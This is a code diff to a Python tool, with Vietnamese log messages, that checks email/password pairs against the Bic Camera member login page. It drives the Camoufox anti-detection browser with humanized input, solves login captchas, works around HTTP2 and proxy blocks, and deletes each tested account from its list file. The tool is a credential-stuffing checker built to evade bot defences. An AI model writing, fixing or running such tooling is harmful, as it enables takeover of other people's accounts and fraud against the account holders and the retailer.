@@ -17,6 +17,7 @@ import numpy as np
 from browserforge.fingerprints import Screen
 import asyncio
 import os
+from camoufox import DefaultAddons
 os.makedirs("./debug", exist_ok=True)
 
 colorama.init()
@@ -259,8 +260,8 @@ async def check_account(browser, email, password):
     try:
         logging.info(f"Bắt đầu kiểm tra tài khoản: {email}")
         page = await browser.new_page()
-        await page.goto("https://www.biccamera.com/bc/member/SfrLogin.jsp")
-        await page.wait_for_timeout(3000)
+        await page.goto("https://www.biccamera.com/bc/member/SfrLogin.jsp", timeout=60000)
+        await asyncio.sleep(3)
 
         # ===== INPUT EMAIL =====
         try:
@@ -285,11 +286,12 @@ async def check_account(browser, email, password):
         # ===== CLICK LOGIN =====
         try:
             login_button = page.locator('button[type="submit"]')
-            await login_button.click()
+            logging.info(f"Đang click button đăng nhập cho {email}...")
+            await login_button.click(timeout=30000)
         except Exception as e:
             logging.warning(f"Không thể click button đăng nhập cho {email}: {repr(e)}")
             is_debug = True
-            return False, "Lỗi click button đăng nhập"
+            return False, f"Lỗi click button đăng nhập: {repr(e)}"
 
         await asyncio.sleep(2)
 
@@ -302,24 +304,26 @@ async def check_account(browser, email, password):
             if await page.locator("#login_imagecheck").count() > 0:
                 await solve_captcha(page)
 
-                await asyncio.sleep(1)
-                await login_button.click()
-                await asyncio.sleep(3)
+                logging.info(f"Đang click login sau khi giải captcha cho {email}...")
+                await login_button.click(timeout=30000)
+                await page.wait_for_timeout(3000)
 
                 # check còn captcha không
                 if await page.locator("#login_imagecheck").count() == 0:
                     logging.info(f"Captcha đã được giải quyết cho {email}.")
                     break
+                else:
+                    logging.warning(f"Captcha vẫn tồn tại cho {email}, thử lại...")
             else:
-                print("No captcha found")
+                logging.info(f"Không tìm thấy captcha cho {email}")
                 break
 
         # ===== WAIT RESULT =====
         result = True, "Đăng nhập thành công"
         html_source = await page.content()
-        if "Secure Connection Failed" in html_source:
-            logging.warning(f"Kết nối bị chặn cho {email}.")
-            result = False, "Kết nối bị chặn - Có thể do proxy"
+        if "Secure Connection Failed" in html_source or "ERR_HTTP2_PROTOCOL_ERROR" in html_source or "HTTP2_ERROR_PROTOCOL" in html_source:
+            logging.warning(f"Kết nối bị chặn hoặc lỗi HTTP2 cho {email}.")
+            result = False, "Kết nối bị chặn hoặc lỗi HTTP2 - Có thể do proxy"
             is_debug = True
             return result[0], result[1]
         # Check "SfrLogin.jsp" vẫn còn trong URL không để xác định nếu login thất bại
@@ -348,10 +352,16 @@ async def check_account(browser, email, password):
         return result[0], result[1]
 
     except Exception as e:
-        logging.error(f"❌ Lỗi trong quá trình kiểm tra cho {email}: {repr(e)}")
+        err_msg = repr(e)
+        if "HTTP2_ERROR_PROTOCOL" in err_msg or "ERR_HTTP2_PROTOCOL_ERROR" in err_msg:
+            logging.error(f"❌ Lỗi giao thức HTTP2 cho {email}: {err_msg}")
+            _remove_account_from_file(email)
+            return False, "Lỗi HTTP2_ERROR_PROTOCOL (Thử lại hoặc kiểm tra proxy)"
+        
+        logging.error(f"❌ Lỗi trong quá trình kiểm tra cho {email}: {err_msg}")
         # Remove account even if there's an exception
         _remove_account_from_file(email)
-        return False, repr(e)
+        return False, err_msg
     finally:
         if is_debug:
             try:
@@ -475,20 +485,30 @@ def main():
                         #         logging.debug(f"Using proxy for {account['email']}: {proxy}")
                         # logging.info(f"Proxy đang sử dụng cho {account['email']}: {proxy['full'] if proxy else 'Không dùng proxy'}")
                         browser_initialized = False
-                        try:
+                        prefs = {
+                                "network.http.spdy.enabled": False,
+                                "network.http.spdy.enabled.deps": False,
+                                "network.http.spdy.enabled.http2": False
+                            }
+                        try:    
+                            
                                 user_data_dir = os.path.join(os.getcwd(), "user-data", f"user-data-{account['email'].replace('@', '_').replace('.', '_')}")
                                 browser_cm = AsyncCamoufox(
-                                    headless=True,
-                                    humanize=True,
-                                    screen=Screen(max_width=1920, max_height=1080),
-                                    geoip=True,
-                                    proxy={
-                                        'server': proxy['server'] if proxy else None,
-                                        'username': proxy['username'] if proxy else None,
-                                        'password': proxy['password'] if proxy else None
-                                    },
+                                    # geoip=True,
+                                    exclude_addons=[DefaultAddons.UBO],
+                                    headless=False,
                                     persistent_context=True,
-                                    user_data_dir=user_data_dir
+                                    user_data_dir=user_data_dir,
+                                    humanize=True,
+                                    # proxy={
+                                    #     "server": proxy['server'],
+                                    #     "username": proxy['username'],
+                                    #     "password": proxy['password']
+                                    # },
+                                    args=[
+                                        # "--disable-http2",
+                                        "--disable-http2-server"
+                                    ],
                                 )
                                 browser = await browser_cm.__aenter__()
                                 browsers.append(browser)
